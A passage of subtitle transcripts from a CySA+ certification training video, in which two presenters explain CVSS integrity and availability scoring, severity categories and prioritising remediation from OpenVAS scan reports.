00:09:43.467\nIntegrity is the ability to modify data.\n\n181\n00:09:43.467 --> 00:09:46.520\n&gt;&gt; Correct, yes that is exactly,\nZach is paying attention,\n\n182\n00:09:46.520 --> 00:09:49.888\nI think he's learning something here and\nI feel good about that.\n\n183\n00:09:49.888 --> 00:09:50.824\n&gt;&gt; I'm happy to learn.\n\n184\n00:09:50.824 --> 00:09:55.025\n&gt;&gt; Yes he is, so we're gonna,\nthat's right, cannot modify data.\n\n185\n00:09:55.025 --> 00:09:58.620\nIf I'm unable to modify any data at all,\nand I get a none.\n\n186\n00:09:58.620 --> 00:09:59.690\nI get the zero score.\n\n187\n00:09:59.690 --> 00:10:01.560\nNope, can't do nothing.\n\n188\n00:10:01.560 --> 00:10:05.050\nI was maybe able to compromise it,\nbut I wasn't able to modify it.\n\n189\n00:10:05.050 --> 00:10:08.900\nI could see it, I could read it, but\nI couldn't write to it or change it, or\n\n190\n00:10:08.900 --> 00:10:09.940\ndo whatever, okay?\n\n191\n00:10:09.940 --> 00:10:11.400\nIt stays the same.\n\n192\n00:10:11.400 --> 00:10:13.050\nIt has not changed.\n\n193\n00:10:13.050 --> 00:10:17.000\nI run a hashing algorithm on\nthe original data, maybe from a backup.\n\n194\n00:10:17.000 --> 00:10:19.200\nAgainst, maybe we've been compromised.\n\n195\n00:10:19.200 --> 00:10:21.100\nWe've noticed that there's no data breach.\n\n196\n00:10:21.100 --> 00:10:24.580\nI halve that value again and\nI see that they're the same.\n\n197\n00:10:24.580 --> 00:10:29.382\nIntegrity is [SOUND] is good,\nno score of zero, right.\n\n198\n00:10:29.382 --> 00:10:33.630\nPartial, again, kind of the same idea\nwe saw back with confidentiality.\n\n199\n00:10:33.630 --> 00:10:37.020\nThe attacker is able to modify some data,\nbut\n\n200\n00:10:37.020 --> 00:10:40.890\nthey don't have control over what\nthey did as they can modify.\n\n201\n00:10:40.890 --> 00:10:42.360\nRight, so same kind of idea.\n\n202\n00:10:42.360 --> 00:10:47.720\nJust inside of the integrity world\nwith data modification, okay.\n\n203\n00:10:47.720 --> 00:10:50.640\nLet's see here, what are we talking about.\n\n204\n00:10:50.640 --> 00:10:52.195\nThat comes to,\n&gt;&gt; Complete.\n\n205\n00:10:52.195 --> 00:10:53.762\n&gt;&gt; Complete, yes, we are on the complete.\n\n206\n00:10:53.762 --> 00:10:57.074\nI think that's all I had to talk\nabout when it came to partial and\n\n207\n00:10:57.074 --> 00:10:58.410\ncomplete is the idea.\n\n208\n00:10:58.410 --> 00:11:00.040\nAgain, full system compromise.\n\n209\n00:11:00.040 --> 00:11:03.442\nNot only am I able to access data but\n\n210\n00:11:03.442 --> 00:11:07.490\nI'm able to completely modify and\ncontrol what data I modify.\n\n211\n00:11:08.950 --> 00:11:11.460\nI can freaking choose from\nanything I want, and so\n\n212\n00:11:11.460 --> 00:11:16.290\nthe system, I have full right\naccess to anything that I want.\n\n213\n00:11:16.290 --> 00:11:20.070\nThat is scary, that's probably\none of the scariest things.\n\n214\n00:11:20.070 --> 00:11:23.670\nIs that someone would be\nable to modify your data.\n\n215\n00:11:23.670 --> 00:11:26.000\nPut stuff in it that you\ndidn't know was there.\n\n216\n00:11:26.000 --> 00:11:29.490\nHide things in alternate data streams,\nthings of that nature, metadata.\n\n217\n00:11:29.490 --> 00:11:32.420\nAll sorts of ways in which data could\nbe modified that can cause you all\n\n218\n00:11:32.420 --> 00:11:33.370\nsorts of havoc.\n\n219\n00:11:33.370 --> 00:11:38.580\nCreate files for backdoor purposes,\nthat would be all.\n\n220\n00:11:38.580 --> 00:11:40.020\nAll bad news,\n&gt;&gt; All Bad.\n\n221\n00:11:40.020 --> 00:11:40.734\n&gt;&gt; And no one would like it.\n\n222\n00:11:40.734 --> 00:11:42.422\nAgain, score of zero point there.\n\n223\n00:11:42.422 --> 00:11:43.003\n&gt;&gt; The no bueno.\n\n224\n00:11:43.003 --> 00:11:45.413\n&gt;&gt; Yeah, no bueno yet again.\n\n225\n00:11:45.413 --> 00:11:48.150\nAll right, and now one more, availablity.\n\n226\n00:11:50.300 --> 00:11:51.710\nLet's hit it up real good.\n\n227\n00:11:53.700 --> 00:11:54.570\nAnd here we go.\n\n228\n00:11:54.570 --> 00:11:56.010\nLet's see here.\n\n229\n00:11:56.010 --> 00:12:03.070\nAvailability, has any disruption to the\nsystem or data occur, has that occurred?\n\n230\n00:12:03.070 --> 00:12:05.550\nThat's what we're looking at\nwhen it comes to availability.\n\n231\n00:12:05.550 --> 00:12:10.840\nIf no disruption's occurred,\neven though an attack could happened or\n\n232\n00:12:10.840 --> 00:12:15.200\nhas happened,\nthat doesn't mean that the ability for\n\n233\n00:12:15.200 --> 00:12:19.990\nusers to use the system resources\nhasn't been diminished at all.\n\n234\n00:12:21.490 --> 00:12:22.580\nThat does happen.\n\n235\n00:12:22.580 --> 00:12:24.020\nThat could be a problem.\n\n236\n00:12:24.020 --> 00:12:26.340\nMaybe they're not in\nthere deleting files or\n\n237\n00:12:26.340 --> 00:12:29.995\nwriting new files which change\nthe way in their experience.\n\n238\n00:12:29.995 --> 00:12:33.520\nBut everything still seems good.\n\n239\n00:12:33.520 --> 00:12:36.980\nI can still get at it,\neven though it might be being hacked at,\n\n240\n00:12:36.980 --> 00:12:40.220\nmaybe confidentiality and\nintegrity have gone out the window.\n\n241\n00:12:40.220 --> 00:12:42.590\nThe availability is still there, right?\n\n242\n00:12:42.590 --> 00:12:44.250\nThis is like web site defacing, right.\n\n243\n00:12:44.250 --> 00:12:50.110\nI haven't taken away your\nability to contact fakenet.com,\n\n244\n00:12:50.110 --> 00:12:51.560\nand open up the web page.\n\n245\n00:12:52.720 --> 00:12:58.309\nBut I've put this site has been\nhacked by hackawars.net, or whatever.\n\n246\n00:12:59.680 --> 00:13:00.680\nThe page is still there.\n\n247\n00:13:00.680 --> 00:13:02.540\nI can still interact with it,\nI can still log in,\n\n248\n00:13:02.540 --> 00:13:05.800\nI can do all the things that I normally\ndo, someone just wrote like their tagline,\n\n249\n00:13:05.800 --> 00:13:11.160\nhahaha, they've basically put some\ndigital graffiti on your website.\n\n250\n00:13:12.310 --> 00:13:16.830\nIt involves the confidentiality and\nthe integrity of the data, but\n\n251\n00:13:16.830 --> 00:13:20.655\nit hasn't messed with the availability at\nall, so you get a zero score for there.\n\n252\n00:13:20.655 --> 00:13:22.060\n&gt;&gt; Mm-hm.\n\n253\n00:13:22.060 --> 00:13:23.220\n&gt;&gt; Partial, yet again,\n\n254\n00:13:23.220 --> 00:13:28.790\nthey have the ability to partially\nkeep you from accessing data.\n\n255\n00:13:28.790 --> 00:13:30.660\nBut not fully, right?\n\n256\n00:13:30.660 --> 00:13:33.940\nSo interesting, this would be\nsystem performances reduced, and\n\n257\n00:13:33.940 --> 00:13:39.290\nresource access is interrupted, but\nnot complete shut down of the system.\n\n258\n00:13:39.290 --> 00:13:43.690\nSome users are still able to gain access,\nbut it's spotty, right?\n\n259\n00:13:43.690 --> 00:13:48.750\nThis guy can get there, but after ten\ntries, I was unable to get to it.\n\n260\n00:13:48.750 --> 00:13:53.200\nRight, so you get just a partial score,\nagain, 0.275.\n\n261\n00:13:53.200 --> 00:13:58.490\nAnd then moving into complete,\nwell, that's basically\n\n262\n00:13:58.490 --> 00:14:04.500\nthink DDOS kind of business,\nwhere we've done some sort of flooding,\n\n263\n00:14:04.500 --> 00:14:12.040\nand the service is completely\nhammer trying to fulfill requests.\n\n264\n00:14:12.040 --> 00:14:16.000\nOr whatever, it soaked up all\nthe bandwidth and therefore it can't be\n\n265\n00:14:16.000 --> 00:14:18.580\ncontacted because there's no\nbandwidth to contact it through.\n\n266\n00:14:18.580 --> 00:14:20.640\nThese are the kind of attacks\nthat we're thinking of.\n\n267\n00:14:20.640 --> 00:14:24.990\nI'm unable to at any time at all,\n\n268\n00:14:24.990 --> 00:14:29.360\nI can't get to the system, I can't get\nto the service, I can't get to the file.\n\n269\n00:14:29.360 --> 00:14:30.760\nWhatever it is, right?\n\n270\n00:14:30.760 --> 00:14:35.010\nSo it's complete disruption of,\nI think total black out.\n\n271\n00:14:35.010 --> 00:14:39.900\nThis is worst case scenario\nthat the sky is falling,\n\n272\n00:14:39.900 --> 00:14:42.470\nfires are happening, dogs and\ncats are living together.\n\n273\n00:14:42.470 --> 00:14:43.350\n&gt;&gt; At this point,\n&gt;&gt; [LAUGH]\n\n274\n00:14:43.350 --> 00:14:44.820\n&gt;&gt; This is the point where you wish you\n\n275\n00:14:44.820 --> 00:14:46.000\nhad a honeypot.\n\n276\n00:14:46.000 --> 00:14:48.510\n&gt;&gt; Yeah, yeah, cause you're like, man,\nI wish I knew what was happening.\n\n277\n00:14:48.510 --> 00:14:51.560\nWell, you're probably gonna shut things\noff and start your own mediation of that,\n\n278\n00:14:51.560 --> 00:14:54.070\nthat would It would be a very,\nvery bad, bad day for you.\n\n279\n00:14:54.070 --> 00:14:54.640\n&gt;&gt; Yeah.\n&gt;&gt; But again,\n\n280\n00:14:54.640 --> 00:14:59.410\nit's letting you know that's\na severe level of compromise.\n\n281\n00:14:59.410 --> 00:15:02.230\nYou might want to prioritize\nthis in a different way\n\n282\n00:15:02.230 --> 00:15:06.960\nthan you would another\nattack if you see AC, okay?\n\n283\n00:15:06.960 --> 00:15:07.730\nSo very important.\n\n284\n00:15:09.200 --> 00:15:11.470\nAll right, well, let's see here.\n\n285\n00:15:11.470 --> 00:15:15.440\nWell, Zach I think we might have enough\ntime to get into the base scores.\n\n286\n00:15:15.440 --> 00:15:16.846\n&gt;&gt; Wow.\n&gt;&gt; Yeah, I think we might have enough\n\n287\n00:15:16.846 --> 00:15:18.004\ntime to get in the base scores.\n\n288\n00:15:18.004 --> 00:15:19.130\n&gt;&gt; The CVSS base score.\n\n289\n00:15:19.130 --> 00:15:20.330\n&gt;&gt; Yeah, so let's do that.\n\n290\n00:15:20.330 --> 00:15:22.200\nLet's tackle the base score.\n\n291\n00:15:22.200 --> 00:15:27.890\nSo now that we know what each one of\nour CVSS vectors are, what they mean,\n\n292\n00:15:27.890 --> 00:15:31.940\nwhat their attributes are, and what that\nmeans, and the scores available to them.\n\n293\n00:15:31.940 --> 00:15:36.270\nWe should now be able to calculate\nwhat the base score would be.\n\n294\n00:15:36.270 --> 00:15:41.272\nAnd that's how we come up with\nthat severity level of 10 or\n\n295\n00:15:41.272 --> 00:15:45.087\n7.5 or 6.5 or whatever we saw, right?\n\n296\n00:15:45.087 --> 00:15:48.743\nAnd then, we're gonna be able\nto after label that high,\n\n297\n00:15:48.743 --> 00:15:51.421\nmedium, low, or critical kind of idea.\n\n298\n00:15:51.421 --> 00:15:52.043\n&gt;&gt; Perfect.\n\n299\n00:15:52.043 --> 00:15:53.391\n&gt;&gt; All right, so\nthat's what we are going to do.\n\n300\n00:15:53.391 --> 00:15:56.702\nLet's take a look at\ncalculating the base score.\n\n301\n00:15:56.702 --> 00:15:58.653\nLet's go here and bring this up.\n\n302\n00:15:58.653 --> 00:16:01.285\n&gt;&gt;

Yep.\n&gt;&gt; And there is some math involved.\n\n308\n00:16:15.380 --> 00:16:19.360\nBut again not crazy, you just need\nto know your order of operations.\n\n309\n00:16:19.360 --> 00:16:23.090\nAnd some simple addition,\nsubtraction, multiplication.\n\n310\n00:16:23.090 --> 00:16:25.180\nYou should be able to\nhandle this pretty easily.\n\n311\n00:16:25.180 --> 00:16:28.380\nGood news is is there's base\nscore calculators out there.\n\n312\n00:16:28.380 --> 00:16:31.380\nOn the web, in your vulnerability scanner,\nOpenVAS has one built in.\n\n313\n00:16:31.380 --> 00:16:32.780\nYou can just go to your-\n&gt;&gt;

Correct.\n\n369\n00:19:09.670 --> 00:19:13.430\n&gt;&gt; Right so, I look at that,\nwell, I got a C,\n\n370\n00:19:13.430 --> 00:19:17.830\nwhich was like 2.2 or 0.275.\n\n371\n00:19:17.830 --> 00:19:20.398\nIf I'm remembering correctly,\nI think, right, is that it?\n\n372\n00:19:20.398 --> 00:19:25.060\nYeah, 0.275,\nsee you gotta memorize these things.\n\n373\n00:19:25.060 --> 00:19:30.610\nI will plug that in, and then,\nmy 1 minus 0.275, there you go, right?\n\n374\n00:19:30.610 --> 00:19:32.270\nYou do that for each one of them.\n\n375\n00:19:32.270 --> 00:19:35.330\nAnd then, put it all together,\nas you can see.\n\n376\n00:19:35.330 --> 00:19:39.340\nYou just gotta follow the order of\noperations, and multiply that by 10.41.\n\n377\n00:19:39.340 --> 00:19:43.060\nAnd then you will get the impact score\nwhich will then be multiplied by .6 will\n\n378\n00:19:45.840 --> 00:19:48.320\nbecome that portion of that.\n\n379\n00:19:48.320 --> 00:19:49.510\nSo it's a bit complicated,\n\n380\n00:19:49.510 --> 00:19:53.270\nYou gotta do a bit of math here\nto work your way through one.\n\n381\n00:19:53.270 --> 00:19:55.400\nSo, play around with this,\n\n382\n00:19:55.400 --> 00:19:59.760\nyou know, make up some fake CVSS vectors\n&gt;&gt; Mm-hmm, Mm-hmm\n\n383\n00:19:59.760 --> 00:20:00.510\n&gt;&gt; And\n\n384\n00:20:00.510 --> 00:20:03.010\nsee if your able to\ncalculate out the score.\n\n385\n00:20:03.010 --> 00:20:06.820\nAnd you can use a calculator to very\nwhether or not you did it correctly.\n\n386\n00:20:06.820 --> 00:20:08.390\nRight, so that'll give you\nthe verification you need.\n\n387\n00:20:08.390 --> 00:20:10.150\n&gt;&gt;

I'm trying,\napprentice cyber sleuth yeah.\n\n433\n00:22:06.350 --> 00:22:10.500\n&gt;&gt; So now that we have that,\nonce we have that base score calculation.\n\n434\n00:22:10.500 --> 00:22:17.000\nWe've got a very important thing which\nis putting them into categories.\n\n435\n00:22:17.000 --> 00:22:18.720\nLow, medium, high, and critical.\n\n436\n00:22:19.900 --> 00:22:21.870\nBut what constitutes that?\n\n437\n00:22:21.870 --> 00:22:23.120\nAnd that's what we need to know.\n\n438\n00:22:23.120 --> 00:22:26.650\nAnd there is a standardization for\nthat, which I have right here.\n\n439\n00:22:28.120 --> 00:22:30.070\nSo here's our base score categorization.\n\n440\n00:22:30.070 --> 00:22:33.250\nEven the open viage showed a ten as high.\n\n441\n00:22:33.250 --> 00:22:37.490\nI think for the exam they're going to\nlook for critical, and you can see that.\n\n442\n00:22:37.490 --> 00:22:42.910\nWe've got low, medium, high and critical,\ncritical being that 10.0 score.\n\n443\n00:22:42.910 --> 00:22:47.360\nSo open bar, again these are just\nagreed-upon things that are not.\n\n444\n00:22:47.360 --> 00:22:49.980\nThere's not a g-man gonna come to\nyour house and kick down your door.\n\n445\n00:22:49.980 --> 00:22:53.280\nAnd say you labeled a 10.0\nas high get in the car.\n\n446\n00:22:53.280 --> 00:22:55.590\nYou know that's not gonna happen.\n\n447\n00:22:55.590 --> 00:22:57.310\n&gt;&gt; And I'm glad that won't happen.\n\n448\n00:22:57.310 --> 00:23:02.420\n&gt;&gt; Yeah, yeah, this is a gentleman's\nagreement to abide by these things.\n\n449\n00:23:02.420 --> 00:23:06.910\nYou see some derivation in the real world,\nthat's fine, no big deal.\n\n450\n00:23:06.910 --> 00:23:13.130\nYou get that high is a problem and whether\nor not this is critical versus high.\n\n451\n00:23:13.130 --> 00:23:15.210\nMight not impact you practically.\n\n452\n00:23:15.210 --> 00:23:16.660\nFor the exam it might impact you.\n\n453\n00:23:16.660 --> 00:23:18.963\nSo memorize these scores.\n\n454\n00:23:18.963 --> 00:23:26.620\nLow: Less than 4.0,\nnot 4.0 or lower, okay?\n\n455\n00:23:26.620 --> 00:23:32.580\nIt's less than 4.0, so\n0 to 3.9 is what we're talking, okay?\n\n456\n00:23:33.770 --> 00:23:40.171\nMedium: Greater than OR\nEqual to 4.0 BUT less than 6.0.\n\n457\n00:23:40.171 --> 00:23:45.453\nAgain, not 6.0, so\nthis will be 4.0 to 5.9.\n\n458\n00:23:45.453 --> 00:23:47.805\nI guess I could of just wrote that, but\n\n459\n00:23:47.805 --> 00:23:50.532\nthis is the way they\nwant you to memorize it.\n\n460\n00:23:50.532 --> 00:23:53.811\nHigh: Greater than OR Equal to 6.0 BUT\n\n461\n00:23:53.811 --> 00:23:59.162\nLess than 10 being 6.0 to 9.9 And\nthen 10 being critical.\n\n462\n00:23:59.162 --> 00:24:03.180\nSo these are the categorizations\nthat we have available to us.\n\n463\n00:24:03.180 --> 00:24:08.170\nAnd through these categorizations\nwe'll be able to better prioritize,\n\n464\n00:24:08.170 --> 00:24:10.310\nwhat we need to for remediation.\n\n465\n00:24:10.310 --> 00:24:12.970\nWhich is gonna be our next episode,\ntalking about remediation.\n\n466\n00:24:12.970 --> 00:24:15.610\nSo, I won't bore us with the details here.\n\n467\n00:24:15.610 --> 00:24:17.810\nPlus, we have very little\ntime to get into that.\n\n468\n00:24:17.810 --> 00:24:22.670\nAnyway, but now you understand the\ncategories and if I see a category that's\n\n469\n00:24:22.670 --> 00:24:27.023\n6.8, I understand it's high,\nbut it's not 10.0, right?\n\n470\n00:24:27.023 --> 00:24:32.076\nSo we've given ourselves a real\nvalue which we can hook into,\n\n471\n00:24:32.076 --> 00:24:34.317\nwe can grab onto, and say.\n\n472\n00:24:34.317 --> 00:24:38.370\n\"You know what, this is a big deal,\nI need to look at this\".\n\n473\n00:24:38.370 --> 00:24:41.605\nWe're also gonna look in some other\ninteresting facts that come in to\n\n474\n00:24:41.605 --> 00:24:42.342\nremediation.\n\n475\n00:24:42.342 --> 00:24:46.794\nAs well, that can kind of shake that\nmonkey tree a little bit, and make you go,\n\n476\n00:24:46.794 --> 00:24:49.750\nthis isn't as easy as I\nthought it was gonna be.\n\n477\n00:24:49.750 --> 00:24:51.040\nAnd it never is.\n\n478\n00:24:51.040 --> 00:24:52.170\nIt never is, I'm so sorry.\n\n479\n00:24:52.170 --> 00:24:56.070\nBut that's basically the CVSS, hopefully\nI think of giving you the everything\n\n480\n00:24:56.070 --> 00:24:57.780\nyou guys need to know about that for\n\n481\n00:24:57.780 --> 00:25:01.560\nthe exam, not just the exam that should\nget you a pretty good standpoint.\n\n482\n00:25:01.560 --> 00:25:03.628\nLike I've said before go\ncheck out version three and\n\n483\n00:25:03.628 --> 00:25:05.137\nsee the differences between the two.\n\n484\n00:25:05.137 --> 00:25:09.357\nCheck out the website that I showed you in\nthe previous episode that gives you that\n\n485\n00:25:09.357 --> 00:25:11.729\ndetailed view of what\neach one of these go to.\n\n486\n00:25:11.729 --> 00:25:16.881\nThere's also things like temporal scores\nand other things that are a part of it.\n\n487\n00:25:16.881 --> 00:25:18.376\nWhich you could see in the real world, but\n\n488\n00:25:18.376 --> 00:25:20.970\nthey're not going to ask you about\nany exams so I left them off.\n\n489\n00:25:20.970 --> 00:25:23.400\nI'll leave you to that\nto go check that out.\n\n490\n00:25:23.400 --> 00:25:26.590\nCould be very very helpful in calculating\n\n491\n00:25:26.590 --> 00:25:30.670\nthe severity of a vulnerability\nfound on your network.\n\n492\n00:25:30.670 --> 00:25:35.300\n&gt;&gt; Vulnerability CVSS part two,\nexcellent episode, thank you Daniel.\n\n493\n00:25:35.300 --> 00:25:39.050\nAnd part one, make sure you see both of\nthem and want you to get a little more of\n\n494\n00:25:39.050 --> 00:25:41.150\na tease on remediation,\nwhich will be the next episode.\n\n495\n00:25:41.150 --> 00:25:44.120\n&gt;&gt; Yeah, it's gonna be a lot of fun,\nremediation is basically, we're gonna take\n\n496\n00:25:44.120 --> 00:25:50.610\nthese CDSS scores and use them so that\nwe can figure out, where should I start.\n\n497\n00:25:50.610 --> 00:25:53.260\nWhat should I begin with when\nit comes to remediation?\n\n498\n00:25:53.260 --> 00:25:57.420\nWe're also gonna take a look at some\nof the things that might be roadblocks.\n\n499\n00:25:57.420 --> 00:26:02.020\nTo our remediation process that we might\nhave to work around, or through, or\n\n500\n00:26:02.020 --> 00:26:06.650\nwith or whatever, things you might not\nhave thought of, to be honest with ya.\n\n501\n00:26:06.650 --> 00:26:09.930\nSo I look forward to doing that,\nit’s an interesting topic.\n\n502\n00:26:09.930 --> 00:26:11.385\n&gt;&gt; Awesome, and\nDaniel’s doing a great job.\n\n503\n00:26:11.385 --> 00:26:16.300\nCYSA+, wonderful series, make sure you see\nevery episode, you’ll be glad you did.\n\n504\n00:26:16.300 --> 00:26:17.650\nAnd you’ll be inside the course library,\n\n505\n00:26:17.650 --> 00:26:19.850\nwhere there’s thousands\nof hours of content.\n\n506\n00:26:19.850 --> 00:26:22.175\nIt's there to help you go further,\nso check that out too.\n\n507\n00:26:22.175 --> 00:26:24.800\nAnd tell everybody you know about ITProTV.\n\n508\n00:26:24.800 --> 00:26:26.040\nITProTV is binge-worthy.\n\n509\n00:26:26.040 --> 00:26:27.272\nThanks for watching, I'm Jack Memes.\n\n510\n00:26:27.272 --> 00:26:27.992\n&gt;&gt;

Well, remediation, Daniel.\n\n26\n00:01:08.661 --> 00:01:10.909\nWe're talking about remediation now.\n&gt;&gt; Yeah.\n\n27\n00:01:10.909 --> 00:01:12.145\n&gt;&gt; What are we saying with this?\n\n28\n00:01:12.145 --> 00:01:14.017\n&gt;&gt; With remediation basically,\n\n29\n00:01:14.017 --> 00:01:17.833\nwhat we're saying is,\nif I've discovered a vulnerability,\n\n30\n00:01:17.833 --> 00:01:21.800\nif I've discovered a problem of any kind,\nreally, what do I do?\n\n31\n00:01:21.800 --> 00:01:23.940\nHow do I make it not a problem?\n\n32\n00:01:23.940 --> 00:01:26.180\nAnd how do I make it not a threat or\n\n33\n00:01:26.180 --> 00:01:31.190\nat least bring the severity of\nit down to an acceptable level?\n\n34\n00:01:31.190 --> 00:01:32.740\nThat's remediation.\n\n35\n00:01:32.740 --> 00:01:38.930\nSo, this is going to include all sorts\nof things, from the broad spectrum of\n\n36\n00:01:38.930 --> 00:01:44.770\ncomplete removal of the threat to\nmaybe implementing compensating\n\n37\n00:01:44.770 --> 00:01:49.850\ncontrols to mitigate the threat down\nto like I said, an acceptable level.\n\n38\n00:01:49.850 --> 00:01:50.680\nIt's all I'm gonna talk about,\n\n39\n00:01:50.680 --> 00:01:53.240\nyour risk appetite,\nthat is all gonna come into play.\n\n40\n00:01:53.240 --> 00:01:55.790\nThings and\nterms that we've been discussing,\n\n41\n00:01:55.790 --> 00:01:59.610\nthis will be the culmination\nof those efforts.\n\n42\n00:01:59.610 --> 00:02:02.910\nWe've found out what\nkinda risk we can handle.\n\n43\n00:02:02.910 --> 00:02:06.140\nWe've categorized our risk,\nwe've looked for risks and\n\n44\n00:02:06.140 --> 00:02:08.530\nput them in their proper areas.\n\n45\n00:02:08.530 --> 00:02:12.840\nNow, we need to do,\nwhat can we do bring all that down or\n\n46\n00:02:12.840 --> 00:02:17.670\nprotect ourselves,\nthat's remediation, at the best case,\n\n47\n00:02:17.670 --> 00:02:22.600\ngetting rid of the risk at the worst case,\nbringing it down to an acceptable level.\n\n48\n00:02:22.600 --> 00:02:24.000\nThat's what we're talking\nabout of remediation.\n\n49\n00:02:24.000 --> 00:02:25.700\n&gt;&gt; So we're gonna be doing some scanning,\n\n50\n00:02:25.700 --> 00:02:26.820\nI'm sure, right?\n&gt;&gt; Yes.\n\n51\n00:02:26.820 --> 00:02:31.410\nSo, the scanning is a part of that,\nwe've looked at CVSS and how that works,\n\n52\n00:02:31.410 --> 00:02:34.380\nwe looked at scheduling a scan but\nonce we've done that,\n\n53\n00:02:34.380 --> 00:02:39.070\nonce we've executed a scan,\nhow does that look?\n\n54\n00:02:39.070 --> 00:02:43.200\nAnd we've seen a little bit of it, right\nand in the context of the different shows\n\n55\n00:02:43.200 --> 00:02:46.730\nthat we've looked at, let's look at\nit in the context of remediation.\n\n56\n00:02:46.730 --> 00:02:50.800\nLet's jump into the computer,\nI'm logged into the dashboard of Open VAS.\n\n57\n00:02:50.800 --> 00:02:53.530\nI've got all this information\nstaring me in the face going,\n\n58\n00:02:54.530 --> 00:02:55.560\nwell what do I do with this.\n\n59\n00:02:55.560 --> 00:02:57.040\nObviously where we'd want to go.\n\n60\n00:02:57.040 --> 00:02:59.970\nAt this point, is kind of looking\nat the results of a scanner.\n\n61\n00:02:59.970 --> 00:03:01.560\nI can look at reports.\n\n62\n00:03:01.560 --> 00:03:02.260\nI'll go to results.\n\n63\n00:03:02.260 --> 00:03:03.210\nI think that's where I want to go.\n\n64\n00:03:03.210 --> 00:03:05.170\nI can never remember reports and results.\n\n65\n00:03:05.170 --> 00:03:07.950\nSuch an interesting place.\n\n66\n00:03:07.950 --> 00:03:11.060\nBut yeah, I think I need to go to reports.\n\n67\n00:03:11.060 --> 00:03:11.880\nThat's where I need to rock.\n\n68\n00:03:13.490 --> 00:03:16.860\nI'm gonna pop over there,\nas soon as it lets me, there we go.\n\n69\n00:03:16.860 --> 00:03:19.830\nAnd let me zoom in from down here.\n\n70\n00:03:19.830 --> 00:03:22.000\nI've got my different results.\n\n71\n00:03:22.000 --> 00:03:23.380\nI've got this immediate scan.\n\n72\n00:03:23.380 --> 00:03:28.620\nI've got a high severity, giving me\nthat 10,000 foot view of that system.\n\n73\n00:03:28.620 --> 00:03:33.400\nHere's the overall severity level of\nthe criticality of the vulnerabilities\n\n74\n00:03:33.400 --> 00:03:37.300\nfound inside of this immediate scan\nthat you ran against this one machine or\n\n75\n00:03:37.300 --> 00:03:42.240\nrange of machines,\ngiving that overarching look.\n\n76\n00:03:42.240 --> 00:03:44.390\nSo if I were to have multiple scans here,\n\n77\n00:03:44.390 --> 00:03:48.160\nmaybe I'm scanning individual\nmachines on the network.\n\n78\n00:03:48.160 --> 00:03:51.790\nInstead of creating a range,\nI did them individually.\n\n79\n00:03:51.790 --> 00:03:54.744\nI could easily look here,\nlook at the severity.\n\n80\n00:03:54.744 --> 00:04:00.680\nAnd say, let me categorize\nthese by their severity or\n\n81\n00:04:00.680 --> 00:04:02.980\nprioritize them by their severity.\n\n82\n00:04:02.980 --> 00:04:04.550\nSo once I've kicked off those scans,\n\n83\n00:04:04.550 --> 00:04:08.210\nthey're done, it's basically scan\nexecution wrapped up in a ball.\n\n84\n00:04:08.210 --> 00:04:12.410\nI have scheduled a scan, the scan\nhas run and has generated a report.\n\n85\n00:04:12.410 --> 00:04:13.870\nNow, I can now look at when the scan\n\n86\n00:04:13.870 --> 00:04:14.860\nis done.\n&gt;&gt; Mmhm.\n\n87\n00:04:14.860 --> 00:04:16.640\n&gt;&gt; That's scan execution.\n\n88\n00:04:16.640 --> 00:04:18.827\nAnd I'm verified that these\nthings are working correct, okay?\n\n89\n00:04:20.070 --> 00:04:24.230\nAnd I look at the reports, that's where\nwe're at right now cuz it's going to\n\n90\n00:04:24.230 --> 00:04:28.960\nthe generator port cuz if it doesn't,\nnot a whole lot of good to you, is it?\n\n91\n00:04:28.960 --> 00:04:32.210\nHey, we scanned your system,\nhave a good day.\n\n92\n00:04:32.210 --> 00:04:35.600\n[LAUGH] Yeah and did you find anything?\n\n93\n00:04:35.600 --> 00:04:38.290\nI did, I did.\n&gt;&gt; Yeah, there's no real comfort in that.\n\n94\n00:04:38.290 --> 00:04:39.430\n&gt;&gt; Yeah, not really.\n\n95\n00:04:39.430 --> 00:04:41.810\nNot really helping us there, is it Zach?\n\n96\n00:04:41.810 --> 00:04:45.590\nSo the report is a very important\npart of the end of the scan.\n\n97\n00:04:45.590 --> 00:04:46.530\nIt generates a report.\n\n98\n00:04:46.530 --> 00:04:50.390\nAnd now we got to look at that report and\nmove into the remediation\n\n99\n00:04:50.390 --> 00:04:54.720\nusing the results from those\nreports to prioritize that stuff.\n\n100\n00:04:55.880 --> 00:04:59.110\nSo, let's start with the highest one here,\n\n101\n00:04:59.110 --> 00:05:03.670\nI will go to, that's all I have to do,\nyeah, view the results.\n\n102\n00:05:03.670 --> 00:05:05.240\nAnd I'll zoom out, just a bit.\n\n103\n00:05:06.620 --> 00:05:07.578\nAnd here it is.\n\n104\n00:05:07.578 --> 00:05:11.050\nNow, Open Vas does us\nthe immense pleasure and\n\n105\n00:05:12.530 --> 00:05:17.530\nfavor of go ahead and\nkind of prioritize things for you.\n\n106\n00:05:17.530 --> 00:05:20.130\nAt least they're by the CVSS score.\n\n107\n00:05:20.130 --> 00:05:21.440\nThat's basically what it's doing.\n\n108\n00:05:21.440 --> 00:05:25.020\nIt's prioritizing based on the CVSS score.\n\n109\n00:05:25.020 --> 00:05:26.940\nNow, it's our job to come in here and\n\n110\n00:05:26.940 --> 00:05:30.380\nsay, is that the way we\nwant to prioritize things?\n\n111\n00:05:30.380 --> 00:05:31.260\nCuz that's an interesting question.\n\n112\n00:05:31.260 --> 00:05:36.650\nCuz it might not be, even though\nwe've got criticality 10, right?\n\n113\n00:05:36.650 --> 00:05:41.374\nThat severity level is the tippity-top.\n\n114\n00:05:41.374 --> 00:05:44.659\nShould I start with that and\nthere's some reasons you\n\n115\n00:05:44.659 --> 00:05:47.289\nmight now want to.\n&gt;&gt; And once your enterprise that best\n\n116\n00:05:47.289 --> 00:05:49.590\npractices, as far as this is concerned.\n&gt;&gt; Yes and\n\n117\n00:05:49.590 --> 00:05:51.230\nhopefully that's exactly\nwhat you've been doing.\n\n118\n00:05:51.230 --> 00:05:56.130\nYou've been working on this whole process,\nin this program that you're developing.\n\n119\n00:05:56.130 --> 00:05:58.050\nSo that you would know [COUGH],\n\n120\n00:05:58.050 --> 00:06:03.860\nexcuse me, how you would prioritize these\nthings and you just follow that procedure.\n\n121\n00:06:03.860 --> 00:06:06.610\nBut if you haven't set that up yet\nand we have to take a look at things,\n\n122\n00:06:06.610 --> 00:06:07.930\nthere are something interesting factors.\n\n123\n00:06:07.930 --> 00:06:15.246\nThe factors might be, let me put it this\nway, I've got a vulnerability severity 10,\n\n124\n00:06:15.246 --> 00:06:19.400\nthen I've got four other vulnerabilities\nand their severity is 6 each.\n\n125\n00:06:21.500 --> 00:06:22.702\nWhich one do I do first?\n\n126\n00:06:22.702 --> 